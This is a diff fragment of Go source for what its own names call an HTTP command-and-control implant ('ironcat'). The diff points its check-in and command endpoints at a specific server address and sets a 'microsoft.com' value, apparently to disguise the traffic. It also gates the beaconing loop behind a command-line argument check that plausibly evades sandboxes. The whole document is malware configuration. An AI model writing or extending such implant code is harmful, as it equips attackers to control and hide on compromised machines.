@@ -16,8 +16,8 @@ import (
 )
 
 var (
-	ip               string = "127.0.0.1" //put the ip of your server.
-	url              string = ""
+	ip               string = "172.31.24.10:443" //put the ip of your server.
+	url              string = "microsoft.com"
 	checkin_endpoint string = "http://" + ip + "/checkin"
 	c2_endpoint      string = "http://" + ip + "/cmdctrl"
 	//user_agent       string = "ironcat-http-c2"
@@ -157,7 +157,9 @@ func c2() {
 }
 
 func main() {
+arg_count := len(os.Args)-1
 
+if arg_count > 1 {
 	for 1 == 1 {
 
 		switch checkin() {
@@ -175,5 +177,6 @@ func main() {
 		}
 
 	}
+}else{fmt.Println("--Ironcat will not speak until you provide treats--")}
 
 }
